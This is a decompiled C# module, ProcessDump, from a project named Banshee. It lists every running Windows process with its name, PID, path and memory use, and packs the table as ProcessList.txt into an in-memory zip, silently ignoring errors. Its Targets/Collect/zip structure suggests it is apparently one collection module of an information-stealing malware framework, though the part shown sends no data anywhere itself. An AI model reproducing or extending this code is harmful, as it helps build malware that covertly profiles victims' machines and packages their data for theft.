﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Banshee.Helper;
using Banshee.Helper.Data;

namespace Banshee.Targets.Device
{
	// Token: 0x0200005C RID: 92
	public class ProcessDump : ITarget
	{
		// Token: 0x060000ED RID: 237 RVA: 0x00007160 File Offset: 0x00007160
		public void Collect(InMemoryZip zip, Counter counter)
		{
			try
			{
				List<ProcessWindows.ProcInfo> list = ProcessWindows.GetProcInfos().ToList<ProcessWindows.ProcInfo>();
				if (list.Count != 0)
				{
					int totalWidth = Math.Max("Name".Length, list.Max(delegate(ProcessWindows.ProcInfo p)
					{
						string name = p.Name;
						if (name == null)
						{
							return 0;
						}
						return name.Length;
					}));
					int totalWidth2 = Math.Max("PID".Length, list.Max(delegate(ProcessWindows.ProcInfo p)
					{
						string pid = p.Pid;
						if (pid == null)
						{
							return 0;
						}
						return pid.Length;
					}));
					int totalWidth3 = Math.Max("Path".Length, list.Max(delegate(ProcessWindows.ProcInfo p)
					{
						string path = p.Path;
						if (path == null)
						{
							return 0;
						}
						return path.Length;
					}));
					int totalWidth4 = Math.Max("Mem".Length, list.Max(delegate(ProcessWindows.ProcInfo p)
					{
						string memory = p.Memory;
						if (memory == null)
						{
							return 0;
						}
						return memory.Length;
					}));
					string text = string.Concat(new string[]
					{
						"Name".PadRight(totalWidth),
						" | ",
						"PID".PadRight(totalWidth2),
						" | ",
						"Path".PadRight(totalWidth3),
						" | ",
						"Mem".PadRight(totalWidth4)
					});
					string value = new string('-', text.Length);
					StringBuilder stringBuilder = new StringBuilder();
					stringBuilder.AppendLine(text);
					stringBuilder.AppendLine(value);
					IOrderedEnumerable<ProcessWindows.ProcInfo> source = from x in list
					orderby x.Name ?? string.Empty
					select x;
					Func<ProcessWindows.ProcInfo, int> keySelector;
					Func<ProcessWindows.ProcInfo, int> <>9__5;
					if ((keySelector = <>9__5) == null)
					{
						int result;
						keySelector = (<>9__5 = delegate(ProcessWindows.ProcInfo x)
						{
							if (int.TryParse(x.Pid, out result))
							{
								return result;
							}
							return int.MaxValue;
						});
					}
					foreach (ProcessWindows.ProcInfo procInfo in source.ThenBy(keySelector))
					{
						stringBuilder.AppendLine(string.Concat(new string[]
						{
							(procInfo.Name ?? "Unknown").PadRight(totalWidth),
							" | ",
							(procInfo.Pid ?? "Unknown").PadRight(totalWidth2),
							" | ",
							(procInfo.Path ?? "Unknown").PadRight(totalWidth3),
							" | ",
							(procInfo.Memory ?? "Unknown").PadRight(totalWidth4)
						}));
					}
					zip.AddTextFile("ProcessList.txt", stringBuilder.ToString());
				}
			}
			catch
			{
			}
		}
	}
}
